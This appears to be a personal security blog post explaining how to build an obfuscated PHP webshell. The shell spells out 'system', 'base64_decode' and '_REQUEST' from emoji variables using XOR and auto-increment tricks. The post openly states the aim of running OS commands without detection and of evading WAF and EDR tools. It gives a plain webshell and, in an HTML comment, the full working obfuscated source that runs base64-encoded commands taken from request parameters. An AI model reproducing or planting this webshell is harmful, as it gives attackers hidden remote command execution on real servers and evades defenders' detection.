+++
title = 'Emoji Webshell 🐚'
description = "Create obfuscated webshell using emoji in php."
date = 2022-09-22T15:33:41+08:00
draft = false
tags = [ "php", "development" ]
weight = 3
# categories = [ "development" ]
# author =  ["Me"]
# [cover]
# image = "img/1.png"
+++

## Introduction

Last time I tried to push myself on learning how to construct a webshell without using any alphabet in PHP. There are a lot of techniques that can be used such as base operation, auto increment, XOR and etc. This [blog](https://websec-readthedocs-io.translate.goog/zh/latest/language/php/webshell.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=zh-CN) have decent techniques that can be used for obfuscation.
{{< figure src="/img/posts/emoji_webshell/1.png" >}}


## Objective of obfuscated webshell

The objective of obfuscation webshell is simple, execute os command without detection. Im assuming the server's configuration is not disabling php functions like `system()`, `passthru()`, `shell_exec()` and other functions that can execute OS command. If the server disabling those function, there will be another topic to bypass the protection. In this blog, we are going to use base64 as encoding, well, it is not recommended in the real world because WAF and EDR pretty good handling base64, so consider to use other method to encode/encrypt when the payload. Anyway, below is my simple webshell:

```php
<?php

$a = $_REQUEST_[4] ? base64_decode($_REQUEST[4]) : 'whoami'; // [1]
@system($a); // [2]
```
- `[1]`: try to check if `$_REQUEST[4]` is empty or not, if not empty, decode it using base64 and store it in `$a` variable. Otherwise, it'll store `whoami` instead.
- `[2]`: Execute command from variable `$a`.

The idea is simple. The crucial part is how to generate alphabet without using alphabet at all. One of my idea is by using XOR and auto increment operation to generate alphabet and numbers, and set it to emoji as variable. Below are how I use auto increment to generate alphabets.

<!-- ```php
<?php

$_=[];                      // $_ = [];
$_=@"$_";                   // $_ = "Array";
$__=("_"=="_")+("_"=="_");  // $__ = 1 + 1;
$_=@$_[++$__];              // $_ = $_[3] // "Array"[3]
``` -->
{{< figure src="/img/posts/emoji_webshell/2.png" caption="Figure 1: Variable iteration" width="55%" align="center" >}}

Based on Figure 1:
- line 3: Set `$_` variable to an array.
- line 4: Convert array to "Array" in string datatype.
- line 5: `("_" == "_")` is comparing two string, if true it will return 1. `("_" == "_") + ("_" == "_")`, then `(1) + (1)` and becomes 2.
- line 6: `@$_[++$__]` means `@$_[3]`, so it will takes 4th argument from "Array" which is "a".
- line 8-33: Set emoji to 'a' until 'z'. When we increment variable that contains "a", it will become "b" and so on.

After constructing alphabet, then we can use the certain function like `base64_decode()`, `$_POST[]` and `system()`. Noted that we cannot use [`eval()`](https://www.php.net/manual/en/function.eval.php) as variable since it is a constructor, not a [variable function](https://www.php.net/manual/en/functions.variable-functions.php).

{{< figure src="/img/posts/emoji_webshell/3.png" caption="Figure 2: Contruct emoji operation" width="100%" align="center" >}}

Based on Figure 2:
- line 35-37: increment the number.
- line 38: set variable `$👿` to "base6".
- line 39-40: decrement the number.
- line 41: construct the word "base64_decode". If you notice, we are using XOR operation to this line to contruct an ascii underscore "_" by xoring hastag with pipe(I would say) `"#" ^ "|"`
- line 43: set variable `$💀` to "system".
- line 44: set variable `$🥳` as "_POST" by using XOR operation to create underscore and capital letter since we do not create capital letter at all.
- line 45: check if `$_POST[4]` is set, if set, it will decode the parameter, otherwise set it to "whoami" to variable `$🤯`.
- line 46: execute `system()` with given command.

### Full source code

You can get the full source code at my [github](https://github.com/nightfury99/php-emoji-webshell/blob/main/webshell.php).

{{< figure src="/img/posts/emoji_webshell/4.png" caption="Figure 3: Full source code" width="100%" align="center" >}}

<!-- ```php
<?php

$_=[];                      // $_ = [];
$_=@"$_";                   // $_ = "Array";
$__=("_"=="_")+("_"=="_");  // $__ = 1 + 1;
$_=@$_[++$__];              // $_ = $_[3] // "Array"[3]

$🌏=$_++; // a
$🤮=$_++; // b
$🍪=$_++; // c
$🫣=$_++; // d
$🧁=$_++; // e
$🎂=$_++; // f
$🥃=$_++; // g
$🍔=$_++; // h
$🌘=$_++; // i
$🌗=$_++; // j
$🌖=$_++; // k
$🌕=$_++; // l
$🌒=$_++; // m
$🌓=$_++; // n
$🌔=$_++; // o
$🌰=$_++; // p
$🍘=$_++; // q
$🥗=$_++; // r
$🥥=$_++; // s
$🍑=$_++; // t
$🍋=$_++; // u
$🧇=$_++; // v
$🌮=$_++; // w
$🍕=$_++; // x
$🥯=$_++; // y
$🍣=$_;   // z

$__++; // 4
$__++; // 5
$__++; // 6
$👿=$🤮.$🌏.$🥥.$🧁.$__; // base6
$__--; // 5
$__--; // 4
$👿.=$__.("#"^"|").$🫣.$🧁.$🍪.$🌔.$🫣.$🧁; // base64_decode

$💀=$🥥.$🥯.$🥥.$🍑.$🧁.$🌒; // system
$🥳=("#"^"|").($🍘^"#").($🎂^"#").($🥗^"#").($🧇^"#").($🎂^"#").($🌰^"#").($🌮^"#"); // _REQUEST
$🤯=@${$🥳}[$__] ? $👿(@${$🥳}[$__]) : $🌮.$🍔.$🌔.$🌏.$🌒.$🌘; // $_REQUEST[4] ? base64_decode($_REQUEST[4]) : "whoami"
@$💀($🤯); // @system("command")
``` -->

## Summary

Now, we already learnt how to use XOR and auto increment operation to generate alphabet and numbers. These methods allow us to construct webshell using emoji. I never use this in real world scenario, but if you have your own version and want share, do let me know. 🌵
